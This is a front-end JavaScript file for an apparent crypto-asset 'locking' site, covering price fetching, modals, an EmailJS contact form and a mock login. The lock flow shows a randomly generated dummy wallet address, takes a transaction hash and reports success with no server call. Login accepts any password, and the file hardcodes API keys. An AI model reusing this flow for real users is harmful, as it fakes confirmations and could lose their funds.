// Updated market prices with provided data as fallback
let cryptoPrices = {
    bitcoin: { price: 115124, change: 2.59 },
    ethereum: { price: 4720.29, change: 11.21 },
    solana: { price: 202.19, change: 13.16 },
    binancecoin: { price: 891.43, change: 4.86 },
    cardano: { price: 0.912, change: 9.30 },
    polkadot: { price: 4.15, change: 11.52 }
};

// Fixed date and time (August 24, 2025, 10:37 AM EEST)
const currentDate = new Date('2025-08-24T10:37:00+03:00');

// DOM Elements
const menuToggle = document.getElementById('menuToggle');
const mainNav = document.getElementById('mainNav');
const modal = document.getElementById('lockModal');
const modalClose = document.getElementById('modalClose');
const lockForm = document.getElementById('lockForm');
const assetCards = document.querySelectorAll('.asset-card');
const modalAssetName = document.getElementById('modalAssetName');
const durationBtns = document.querySelectorAll('.duration-btn');
const cancelBtn = document.querySelector('.btn-cancel');
const generateWalletBtn = document.getElementById('generateWallet');
const walletAddressDisplay = document.getElementById('walletAddressDisplay');
const copyAddressBtn = document.getElementById('copyAddress');
const amountInput = document.getElementById('amount');
const amountGroup = document.getElementById('amountGroup');
const amountError = document.getElementById('amountError');
const feeNotification = document.getElementById('feeNotification');
const feeAmountDisplay = document.getElementById('feeAmount');
const feeExplanation = document.getElementById('feeExplanation');
const emailInput = document.getElementById('emailLock');
const emailGroupLock = document.getElementById('emailGroupLock');
const emailErrorLock = document.getElementById('emailErrorLock');
const nextOfKinInput = document.getElementById('nextOfKin');
const nextOfKinGroup = document.getElementById('nextOfKinGroup');
const nextOfKinError = document.getElementById('nextOfKinError');
const transactionHashInput = document.getElementById('transactionHash');
const transactionHashGroup = document.getElementById('transactionHashGroup');
const transactionHashError = document.getElementById('transactionHashError');
const proofInput = document.getElementById('proof');
const submitBtn = document.querySelector('.btn-submit');
const heroCta = document.getElementById('heroCta');
const userModal = document.getElementById('userModal');
const userModalClose = document.getElementById('userModalClose');
const userAreaBtn = document.getElementById('userAreaBtn');
const userLoginForm = document.getElementById('userLoginForm');
const loginForm = document.getElementById('loginForm');
const userDashboard = document.getElementById('userDashboard');
const logoutBtn = document.getElementById('logoutBtn');
const userIdDisplay = document.getElementById('userIdDisplay');
const userEmailDisplay = document.getElementById('userEmailDisplay');
const assetList = document.getElementById('assetList');
const whitepaperModal = document.getElementById('whitepaperModal');
const whitepaperClose = document.getElementById('whitepaperClose');
const whitepaperLink = document.getElementById('whitepaperLink');
const whitepaperLinkFooter = document.getElementById('whitepaperLinkFooter');
const blogLink = document.getElementById('blogLink');
const faqLink = document.getElementById('faqLink');
const faqLinkFooter = document.getElementById('faqLinkFooter');
const tutorialsLink = document.getElementById('tutorialsLink');
const termsLink = document.getElementById('termsLink');
const privacyLink = document.getElementById('privacyLink');
const cookiesLink = document.getElementById('cookiesLink');
const complianceLink = document.getElementById('complianceLink');
const blogModal = document.getElementById('blogModal');
const faqModal = document.getElementById('faqModal');
const tutorialsModal = document.getElementById('tutorialsModal');
const termsModal = document.getElementById('termsModal');
const privacyModal = document.getElementById('privacyModal');
const cookiesModal = document.getElementById('cookiesModal');
const complianceModal = document.getElementById('complianceModal');
const blogClose = document.getElementById('blogClose');
const faqClose = document.getElementById('faqClose');
const tutorialsClose = document.getElementById('tutorialsClose');
const termsClose = document.getElementById('termsClose');
const privacyClose = document.getElementById('privacyClose');
const cookiesClose = document.getElementById('cookiesClose');
const complianceClose = document.getElementById('complianceClose');
const contactUs = document.getElementById('contactUs');
const contactModal = document.getElementById('contactModal');
const contactClose = document.getElementById('contactClose');
const contactFormData = document.getElementById('contactFormData');
const contactSubmitBtn = contactFormData.querySelector('.btn-submit');
const howItWorksLink = document.getElementById('howItWorksLink');
const supportedAssetsLink = document.getElementById('supportedAssetsLink');
const securityLink = document.getElementById('securityLink');
const pricingLink = document.getElementById('pricingLink');
const howItWorksModal = document.getElementById('howItWorksModal');
const supportedAssetsModal = document.getElementById('supportedAssetsModal');
const securityModal = document.getElementById('securityModal');
const pricingModal = document.getElementById('pricingModal');
const howItWorksClose = document.getElementById('howItWorksClose');
const supportedAssetsClose = document.getElementById('supportedAssetsClose');
const securityClose = document.getElementById('securityClose');
const pricingClose = document.getElementById('pricingClose');

// Current asset being processed
let currentAsset = '';
let currentAssetSymbol = '';
let selectedDuration = 12; // Default to 1 year in months

// Initialize EmailJS with Public Key
(function() {
    emailjs.init("tzHPZg8hMgnq1WD9A");
})();

// Debounce utility function
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Show user-friendly error messages
function showError(message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.textContent = message;
    errorDiv.style.cssText = `
        position: fixed; top: 20px; right: 20px; background: rgba(239, 68, 68, 0.9);
        color: white; padding: 1rem; border-radius: 8px; z-index: 2000;
    `;
    document.body.appendChild(errorDiv);
    setTimeout(() => errorDiv.remove(), 5000);
}

// Save user data to localStorage
function saveUserData(email, userId) {
    localStorage.setItem('user', JSON.stringify({ email, userId }));
    localStorage.setItem('lockedAssets', JSON.stringify(getLockedAssets()));
}

// Load user data from localStorage
function loadUserData() {
    const user = JSON.parse(localStorage.getItem('user'));
    if (user) {
        userEmailDisplay.textContent = user.email;
        userIdDisplay.textContent = user.userId;
        loginForm.style.display = 'none';
        userDashboard.style.display = 'block';
        loadLockedAssets();
    }
}

// Load locked assets from localStorage
function loadLockedAssets() {
    const lockedAssets = JSON.parse(localStorage.getItem('lockedAssets')) || [];
    assetList.innerHTML = '';
    lockedAssets.forEach(data => addLockedAsset(data));
}

// Initialize page with fallback prices
function initializePage() {
    console.log('Initializing page with fallback prices...');
    updateAssetPrices();
    loadUserData();
}

// Fetch cryptocurrency prices from CoinGecko API with retry logic
async function fetchCryptoPrices(retries = 3, delay = 1000) {
    const apiKey = 'CG-NJMeo5AxVrKAFSBS8AxLUb4s'; // Demo key
    const ids = 'bitcoin,ethereum,solana,binancecoin,cardano,polkadot';
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true&x_cg_demo_api_key=${apiKey}`;
    
    for (let i = 0; i < retries; i++) {
        try {
            console.log('Fetching prices from CoinGecko...');
            const response = await fetch(url);
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            const data = await response.json();
            
            cryptoPrices.bitcoin.price = data.bitcoin.usd || cryptoPrices.bitcoin.price;
            cryptoPrices.bitcoin.change = data.bitcoin.usd_24h_change || cryptoPrices.bitcoin.change;
            
            cryptoPrices.ethereum.price = data.ethereum.usd || cryptoPrices.ethereum.price;
            cryptoPrices.ethereum.change = data.ethereum.usd_24h_change || cryptoPrices.ethereum.change;
            
            cryptoPrices.solana.price = data.solana.usd || cryptoPrices.solana.price;
            cryptoPrices.solana.change = data.solana.usd_24h_change || cryptoPrices.solana.change;
            
            cryptoPrices.binancecoin.price = data.binancecoin.usd || cryptoPrices.binancecoin.price;
            cryptoPrices.binancecoin.change = data.binancecoin.usd_24h_change || cryptoPrices.binancecoin.change;
            
            cryptoPrices.cardano.price = data.cardano.usd || cryptoPrices.cardano.price;
            cryptoPrices.cardano.change = data.cardano.usd_24h_change || cryptoPrices.cardano.change;
            
            cryptoPrices.polkadot.price = data.polkadot.usd || cryptoPrices.polkadot.price;
            cryptoPrices.polkadot.change = data.polkadot.usd_24h_change || cryptoPrices.polkadot.change;
            
            console.log('Prices updated:', cryptoPrices);
            updateAssetPrices();
            return;
        } catch (error) {
            if (i < retries - 1) {
                console.warn(`Retry ${i + 1} for fetching prices...`);
                await new Promise(resolve => setTimeout(resolve, delay));
            } else {
                console.error('Failed to fetch prices after retries:', error);
                showError('Failed to fetch crypto prices. Using fallback data.');
                updateAssetPrices();
            }
        }
    }
}

// Update asset cards with prices
function updateAssetPrices() {
    const assetIds = ['bitcoin', 'ethereum', 'solana', 'binancecoin', 'cardano', 'polkadot'];
    assetIds.forEach(assetId => {
        const priceElement = document.getElementById(`${assetId}-price`);
        if (priceElement) {
            const price = cryptoPrices[assetId].price;
            const change = cryptoPrices[assetId].change;
            const changeClass = change >= 0 ? 'positive' : 'negative';
            const changeIcon = change >= 0 ? 'fa-arrow-up' : 'fa-arrow-down';
            priceElement.innerHTML = `
                $${price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 3 })}
                <span class="change ${changeClass}">
                    <i class="fas ${changeIcon}"></i> ${Math.abs(change).toFixed(2)}%
                </span>
            `;
            priceElement.querySelector('.price-loading')?.remove();
        } else {
            console.warn(`Price element for ${assetId} not found`);
        }
    });
}

// Update dashboard lock dates
function updateLockDates() {
    const assetItems = document.querySelectorAll('.asset-item');
    assetItems.forEach(item => {
        const durationMonths = parseInt(item.querySelector('p').textContent.match(/\d+/)[0]) || 12;
        const lockDate = new Date(currentDate);
        lockDate.setMonth(lockDate.getMonth() + durationMonths);
        item.querySelector('p').textContent = `Locked until: ${lockDate.toLocaleDateString('en-US', { year: 'numeric', month: '2-digit', day: '2-digit' })}`;
    });
}

// Toggle mobile menu
menuToggle.addEventListener('click', () => {
    console.log('Menu toggle clicked');
    const isActive = mainNav.classList.toggle('active');
    const icon = menuToggle.querySelector('i');
    icon.classList.toggle('fa-bars', !isActive);
    icon.classList.toggle('fa-times', isActive);
    console.log('Menu active:', isActive);
});

// Open modal when asset card is clicked
assetCards.forEach(card => {
    card.addEventListener('click', (e) => {
        if (e.target.tagName !== 'BUTTON') return;
        const assetId = card.getAttribute('data-asset-id');
        currentAsset = assetId;
        currentAssetSymbol = card.getAttribute('data-asset').toUpperCase();
        modalAssetName.textContent = `Lock ${card.getAttribute('data-asset').charAt(0).toUpperCase() + card.getAttribute('data-asset').slice(1)}`;
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        resetForm();
    });
});

// Hero CTA opens Bitcoin modal
heroCta.addEventListener('click', () => {
    currentAsset = 'bitcoin';
    currentAssetSymbol = 'BTC';
    modalAssetName.textContent = 'Lock Bitcoin';
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';
    resetForm();
});

// Generate wallet address
generateWalletBtn.addEventListener('click', () => {
    const walletAddress = generateDummyWalletAddress();
    walletAddressDisplay.textContent = walletAddress;
    walletAddressDisplay.style.display = 'block';
    enableFormFields();
    validateForm();
});

// Copy wallet address
copyAddressBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(walletAddressDisplay.textContent).then(() => {
        copyAddressBtn.textContent = 'Copied!';
        setTimeout(() => { copyAddressBtn.textContent = 'Copy'; }, 2000);
    }).catch(err => {
        console.error('Copy failed:', err);
        showError('Failed to copy wallet address.');
    });
});

// Debounced input handling
const debouncedCalculateFee = debounce(calculateFee, 300);
const debouncedValidateForm = debounce(validateForm, 300);

amountInput.addEventListener('input', debouncedCalculateFee);
[emailInput, transactionHashInput, nextOfKinInput].forEach(input => 
    input.addEventListener('input', debouncedValidateForm)
);

// Close modals
[modalClose, cancelBtn].forEach(btn => btn.addEventListener('click', () => {
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
}));

window.addEventListener('click', (e) => {
    const modals = [modal, userModal, whitepaperModal, blogModal, faqModal, tutorialsModal, termsModal, privacyModal, cookiesModal, complianceModal, contactModal, howItWorksModal, supportedAssetsModal, securityModal, pricingModal];
    modals.forEach(m => {
        if (e.target === m) {
            m.style.display = 'none';
            document.body.style.overflow = 'auto';
            if (m === contactModal) contactFormData.reset();
        }
    });
});

// Duration button selection
durationBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        durationBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        selectedDuration = parseInt(btn.getAttribute('data-months'));
        debouncedCalculateFee();
        debouncedValidateForm();
    });
});

// Form submission (Lock Assets)
lockForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = {
        asset: currentAsset,
        amount: amountInput.value,
        duration: selectedDuration,
        email: emailInput.value,
        nextOfKin: nextOfKinInput.value,
        transactionHash: transactionHashInput.value,
        proof: proofInput.files[0]?.name || 'No file'
    };
    
    try {
        // Note: Replace with actual server-side API call in production
        console.log('Submitted:', formData);
        alert(`Locked ${formData.amount} ${currentAssetSymbol} successfully! Check ${formData.email} for confirmation.`);
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
        addLockedAsset(formData);
        saveUserData(userEmailDisplay.textContent, userIdDisplay.textContent);
    } catch (error) {
        console.error('Lock submission error:', error);
        showError('Failed to lock assets. Please try again.');
    }
});

// User area functionality
userAreaBtn.addEventListener('click', () => {
    userModal.style.display = 'block';
    document.body.style.overflow = 'hidden';
    if (localStorage.getItem('user')) {
        loginForm.style.display = 'none';
        userDashboard.style.display = 'block';
    } else {
        loginForm.style.display = 'block';
        userDashboard.style.display = 'none';
    }
});

userModalClose.addEventListener('click', () => {
    userModal.style.display = 'none';
    document.body.style.overflow = 'auto';
});

// User login
userLoginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const emailGroup = document.getElementById('emailGroup');
    const emailError = document.getElementById('emailError');
    const passwordGroup = document.getElementById('passwordGroup');
    const passwordError = document.getElementById('passwordError');

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    [emailGroup, passwordGroup].forEach(el => el.classList.remove('error', 'valid'));
    [emailError, passwordError].forEach(el => el.style.display = 'none');

    if (!emailRegex.test(email)) {
        emailGroup.classList.add('error');
        emailError.style.display = 'block';
        return;
    }
    if (!password) {
        passwordGroup.classList.add('error');
        passwordError.style.display = 'block';
        return;
    }

    const userId = 'TS-' + Math.floor(1000 + Math.random() * 9000).toString().padStart(4, '0');
    loginForm.style.display = 'none';
    userDashboard.style.display = 'block';
    userIdDisplay.textContent = userId;
    userEmailDisplay.textContent = email;
    saveUserData(email, userId);
    updateLockDates();
});

// Logout
logoutBtn.addEventListener('click', () => {
    localStorage.removeItem('user');
    localStorage.removeItem('lockedAssets');
    loginForm.style.display = 'block';
    userDashboard.style.display = 'none';
    userModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    assetList.innerHTML = '';
});

// Modal links
[whitepaperLink, whitepaperLinkFooter].forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        whitepaperModal.style.display = 'block';
        closeMobileMenu();
    });
});

whitepaperClose.addEventListener('click', () => whitepaperModal.style.display = 'none');

blogLink.addEventListener('click', (e) => {
    e.preventDefault();
    blogModal.style.display = 'block';
    closeMobileMenu();
});

blogClose.addEventListener('click', () => blogModal.style.display = 'none');

[faqLink, faqLinkFooter].forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        faqModal.style.display = 'block';
        closeMobileMenu();
    });
});

faqClose.addEventListener('click', () => faqModal.style.display = 'none');

tutorialsLink.addEventListener('click', (e) => {
    e.preventDefault();
    tutorialsModal.style.display = 'block';
    closeMobileMenu();
});

tutorialsClose.addEventListener('click', () => tutorialsModal.style.display = 'none');

termsLink.addEventListener('click', (e) => {
    e.preventDefault();
    termsModal.style.display = 'block';
    closeMobileMenu();
});

termsClose.addEventListener('click', () => termsModal.style.display = 'none');

privacyLink.addEventListener('click', (e) => {
    e.preventDefault();
    privacyModal.style.display = 'block';
    closeMobileMenu();
});

privacyClose.addEventListener('click', () => privacyModal.style.display = 'none');

cookiesLink.addEventListener('click', (e) => {
    e.preventDefault();
    cookiesModal.style.display = 'block';
    closeMobileMenu();
});

cookiesClose.addEventListener('click', () => cookiesModal.style.display = 'none');

complianceLink.addEventListener('click', (e) => {
    e.preventDefault();
    complianceModal.style.display = 'block';
    closeMobileMenu();
});

complianceClose.addEventListener('click', () => complianceModal.style.display = 'none');

contactUs.addEventListener('click', (e) => {
    e.preventDefault();
    contactModal.style.display = 'block';
    closeMobileMenu();
});

contactClose.addEventListener('click', () => {
    contactModal.style.display = 'none';
    contactFormData.reset();
});

howItWorksLink.addEventListener('click', (e) => {
    e.preventDefault();
    howItWorksModal.style.display = 'block';
    closeMobileMenu();
});

howItWorksClose.addEventListener('click', () => howItWorksModal.style.display = 'none');

supportedAssetsLink.addEventListener('click', (e) => {
    e.preventDefault();
    supportedAssetsModal.style.display = 'block';
    closeMobileMenu();
});

supportedAssetsClose.addEventListener('click', () => supportedAssetsModal.style.display = 'none');

securityLink.addEventListener('click', (e) => {
    e.preventDefault();
    securityModal.style.display = 'block';
    closeMobileMenu();
});

securityClose.addEventListener('click', () => securityModal.style.display = 'none');

pricingLink.addEventListener('click', (e) => {
    e.preventDefault();
    pricingModal.style.display = 'block';
    closeMobileMenu();
});

pricingClose.addEventListener('click', () => pricingModal.style.display = 'none');

// Handle contact form submission with loading state
contactFormData.addEventListener('submit', function(event) {
    event.preventDefault();
    const name = document.getElementById('contactName').value;
    const email = document.getElementById('contactEmail').value;
    const message = document.getElementById('contactMessage').value;

    // Basic client-side validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!name || !emailRegex.test(email) || !message) {
        showError('Please fill out all fields with valid information.');
        return;
    }

    // Show loading state
    contactSubmitBtn.disabled = true;
    contactSubmitBtn.textContent = 'Sending...';

    emailjs.send("service_9f9v29r", "template_6jmbo6x", {
        name: name,
        email: email,
        message: message
    })
    .then(function(response) {
        alert('Email sent successfully!');
        contactModal.style.display = 'none';
        contactFormData.reset();
        contactSubmitBtn.disabled = false;
        contactSubmitBtn.textContent = 'Send';
    }, function(error) {
        console.error('EmailJS error:', error);
        showError('Failed to send email: ' + error.text);
        contactSubmitBtn.disabled = false;
        contactSubmitBtn.textContent = 'Send';
    });
});

// Smooth scrolling
document.querySelectorAll('nav a').forEach(anchor => {
    anchor.addEventListener('click', (e) => {
        if (anchor.getAttribute('href').startsWith('#')) {
            e.preventDefault();
            const target = document.querySelector(anchor.getAttribute('href'));
            if (target) {
                closeMobileMenu();
                window.scrollTo({ top: target.offsetTop - 80, behavior: 'smooth' });
            }
        }
    });
});

// Validation for Lock Form
function validateForm() {
    const amount = amountInput.value;
    const email = emailInput.value;
    const transactionHash = transactionHashInput.value;
    const walletGenerated = walletAddressDisplay.style.display === 'block';

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const hashRegex = /^0x[a-fA-F0-9]{64}$/;

    const amountValid = amount && parseFloat(amount) > 0;
    const emailValid = emailRegex.test(email);
    const hashValid = hashRegex.test(transactionHash);
    const nextOfKinValid = !nextOfKinInput.value || emailRegex.test(nextOfKinInput.value);

    [amountGroup, emailGroupLock, nextOfKinGroup, transactionHashGroup].forEach(group => 
        group.classList.remove('error', 'valid')
    );
    [amountError, emailErrorLock, nextOfKinError, transactionHashError].forEach(error => 
        error.style.display = 'none'
    );

    if (amount && !amountValid) {
        amountGroup.classList.add('error');
        amountError.style.display = 'block';
    } else if (amountValid) {
        amountGroup.classList.add('valid');
    }

    if (email && !emailValid) {
        emailGroupLock.classList.add('error');
        emailErrorLock.style.display = 'block';
    } else if (emailValid) {
        emailGroupLock.classList.add('valid');
    }

    if (nextOfKinInput.value && !nextOfKinValid) {
        nextOfKinGroup.classList.add('error');
        nextOfKinError.style.display = 'block';
    } else if (nextOfKinValid) {
        nextOfKinGroup.classList.add('valid');
    }

    if (transactionHash && !hashValid) {
        transactionHashGroup.classList.add('error');
        transactionHashError.style.display = 'block';
    } else if (hashValid) {
        transactionHashGroup.classList.add('valid');
    }

    submitBtn.disabled = !(walletGenerated && amountValid && emailValid && hashValid && nextOfKinValid);
}

// Helper functions
function resetForm() {
    walletAddressDisplay.style.display = 'none';
    walletAddressDisplay.textContent = 'Your wallet address will appear here';
    [amountInput, emailInput, nextOfKinInput, transactionHashInput, proofInput].forEach(input => input.value = '');
    feeNotification.style.display = 'none';
    disableFormFields();
    durationBtns.forEach(btn => btn.classList.remove('active'));
    document.querySelector('.duration-btn[data-months="12"]').classList.add('active');
    selectedDuration = 12;
}

function disableFormFields() {
    [amountInput, emailInput, nextOfKinInput, transactionHashInput, proofInput].forEach(input => input.disabled = true);
    submitBtn.disabled = true;
}

function enableFormFields() {
    [amountInput, emailInput, nextOfKinInput, transactionHashInput, proofInput].forEach(input => input.disabled = false);
    submitBtn.disabled = true;
}

function generateDummyWalletAddress() {
    const chars = '0123456789ABCDEF';
    let address = '0x';
    for (let i = 0; i < 40; i++) address += chars[Math.floor(Math.random() * 16)];
    return address;
}

function calculateFee() {
    const amount = parseFloat(amountInput.value);
    if (isNaN(amount) || amount <= 0) {
        feeNotification.style.display = 'none';
        return;
    }
    const assetPrice = cryptoPrices[currentAsset].price;
    const usdValue = amount * assetPrice;
    const feePercentage = usdValue <= 1000 ? 0.2 : usdValue <= 100000 ? 0.1 : usdValue <= 1000000 ? 0.005 : 0.001;
    const feeUSD = (usdValue * feePercentage) / 100;
    const feeInCrypto = feeUSD / assetPrice;
    feeAmountDisplay.textContent = `${feeInCrypto.toFixed(8)} ${currentAssetSymbol}`;
    feeExplanation.textContent = `Based on $${assetPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 3 })} per ${currentAssetSymbol} and ${feePercentage}% fee`;
    feeNotification.style.display = 'block';
}

function addLockedAsset(data) {
    if (userDashboard.style.display === 'block') {
        const lockDate = new Date(currentDate);
        lockDate.setMonth(lockDate.getMonth() + data.duration);
        const assetItem = document.createElement('div');
        assetItem.className = 'asset-item';
        assetItem.innerHTML = `
            <div class="asset-info">
                <div class="asset-icon-small" style="color: ${getAssetColor(data.asset)}"><i class="${getAssetIcon(data.asset)}"></i></div>
                <div class="asset-details">
                    <h4>${data.asset.charAt(0).toUpperCase() + data.asset.slice(1)} (${data.asset.toUpperCase()})</h4>
                    <p>Locked until: ${lockDate.toLocaleDateString('en-US', { year: 'numeric', month: '2-digit', day: '2-digit' })}</p>
                </div>
            </div>
            <div class="asset-value">
                <div class="amount">${data.amount} ${data.asset.toUpperCase()}</div>
                <div class="change">+0.00%</div>
            </div>
        `;
        assetList.appendChild(assetItem);
        saveUserData(userEmailDisplay.textContent, userIdDisplay.textContent);
    }
}

function getLockedAssets() {
    const assets = [];
    document.querySelectorAll('.asset-item').forEach(item => {
        const assetName = item.querySelector('h4').textContent.split(' (')[0].toLowerCase();
        const amount = item.querySelector('.amount').textContent.split(' ')[0];
        const duration = parseInt(item.querySelector('p').textContent.match(/\d+/)[0]) || 12;
        assets.push({ asset: assetName, amount, duration });
    });
    return assets;
}

function getAssetIcon(asset) {
    return {
        bitcoin: 'fab fa-bitcoin',
        ethereum: 'fab fa-ethereum',
        solana: 'fas fa-bolt',
        binancecoin: 'fas fa-coins',
        cardano: 'fas fa-chart-line',
        polkadot: 'fas fa-circle-nodes'
    }[asset] || 'fas fa-coins';
}

function getAssetColor(asset) {
    return {
        bitcoin: '#F7931A',
        ethereum: '#627EEA',
        solana: '#00FFA3',
        binancecoin: '#F0B90B',
        cardano: '#0033AD',
        polkadot: '#E6007A'
    }[asset] || '#F0B90B';
}

function closeMobileMenu() {
    if (mainNav.classList.contains('active')) {
        mainNav.classList.remove('active');
        menuToggle.querySelector('i').classList.remove('fa-times');
        menuToggle.querySelector('i').classList.add('fa-bars');
    }
}

// Animation observer with cleanup
const observer = new IntersectionObserver((entries, observer) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = 1;
            entry.target.style.transform = 'translateY(0)';
            observer.unobserve(entry.target);
        }
    });
}, { threshold: 0.1 });

document.querySelectorAll('.asset-card, .feature-card, .stat-card').forEach(el => {
    el.style.opacity = 0;
    el.style.transform = 'translateY(20px)';
    el.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
    observer.observe(el);
});

// Initialize and fetch prices
document.addEventListener('DOMContentLoaded', () => {
    console.log('DOM fully loaded');
    initializePage();
    fetchCryptoPrices().then(() => console.log('Price fetch completed'));
});